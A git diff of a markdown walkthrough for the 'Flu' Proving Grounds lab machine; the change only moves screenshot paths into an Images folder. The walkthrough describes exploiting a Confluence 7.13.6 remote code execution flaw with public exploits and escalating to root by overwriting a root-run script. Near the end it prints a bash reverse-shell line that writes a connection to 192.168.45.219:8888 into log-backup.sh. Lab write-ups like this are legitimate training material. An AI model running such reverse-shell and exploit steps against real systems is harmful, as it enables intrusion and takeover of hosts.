@@ -115,43 +115,43 @@ Nmap done: 1 IP address (1 host up) scanned in 116.94 seconds
 ```
 
 Visiting web server on port 8090.
-![](Flu1.png)
+![](Images/Flu1.png)
 Tried some basic credentials & SQLi but that was a dead end. Instead I tried to find a related RCE for Atlassian Confluence v7.13.6.
-![](Flu2.png)
+![](Images/Flu2.png)
 **Refer for exploit using metasploit.**
 https://medium.com/@basha5969/flu-proving-grounds-5325abd4a4f2
 I tried with the exploit and manage to execute command.
-![](Flu3.png)
+![](Images/Flu3.png)
 However, when I try to get reverse shell with `nc`, it does not work, I wonder if `nc -e` option is not supported. Then tried another reverse shell payload does not work as well, I believe it is due to encoding issue.
 To make our life easier. Decide to find any other exploit from github, we found this that has reverse shell option. And we found this.
 https://github.com/jbaines-r7/through_the_wire
-![](Flu4.png)
+![](Images/Flu4.png)
 Running exploit.
-![](Flu5.png)
+![](Images/Flu5.png)
 We received shell.
-![](Flu6.png)
+![](Images/Flu6.png)
 Got our local flag.
-![](Flu7.png)
+![](Images/Flu7.png)
 
 ### Privilege Escalation
 We tried checking SUID perm, sudo and writable files but found nothing. So we ran linpeas.
 As we see that our file is both executable and owned by the our user “confluence” :
-![](Flu8.png)
+![](Images/Flu8.png)
 One last thing to check if it’s being run by root was running pspy64, so, I transferred it to the target & made it executable to run :
 To install pspy 
 https://github.com/blankshiro/OSCP-Tools/blob/main/pspy64
-![](Flu9.png)
-![](Flu10.png)
-![](Flu11.png)
+![](Images/Flu9.png)
+![](Images/Flu10.png)
+![](Images/Flu11.png)
 Running the pspy.
-![](Flu13.png)
+![](Images/Flu13.png)
 The expected proof is its being run by UID=0 (which is root).
-![](Flu14.png)
-![](Flu12.png)
+![](Images/Flu14.png)
+![](Images/Flu12.png)
 
 We tried multiple bash one line but the didn't work.
 But below one worked and we got the shell.
 `echo 'bash -c "bash -i >& /dev/tcp/192.168.45.219/8888 0>&1"' > log-backup.sh`
 
-![](Flu15.png)
-![](Flu16.png)
+![](Images/Flu15.png)
+![](Images/Flu16.png)
